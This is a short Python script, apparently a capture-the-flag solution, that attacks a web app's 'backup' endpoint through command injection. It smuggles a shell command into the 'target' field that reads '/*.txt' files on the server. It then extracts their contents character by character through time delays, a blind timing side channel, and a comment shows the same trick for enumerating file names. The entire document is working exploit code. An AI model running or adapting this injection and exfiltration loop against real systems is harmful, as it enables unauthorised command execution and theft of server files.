import requests 
import time
url = "https://timeadventure.fiahackingisfun.id.vn/"
charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\!\@\#\$\%\^\&\*\(\)\-\_\+\=\~\`\[\]\{\}\|\:\;\"\'\<\>\,\.\?\/"
flag = ""
# enum file name: if [ "$(ls / | grep .*.txt | cut -c 1)" = "f" ]; then echo true; fi;
baseQuery = "a; if [ \"$(cat /*.txt|cut -c{})\" = \"{}\" ]; then sleep 2; fi;"
while True:
    for char in charset:
        realQuery = baseQuery.format(len(flag)+1, char)
        data = {"command": "backup", "target": realQuery}
        start_time = time.time()
        res = requests.post(url, data= data)
        end_time = time.time()
        real_time = (end_time - start_time)
        if real_time > 2:
            flag = flag + char
            break
    print(flag)
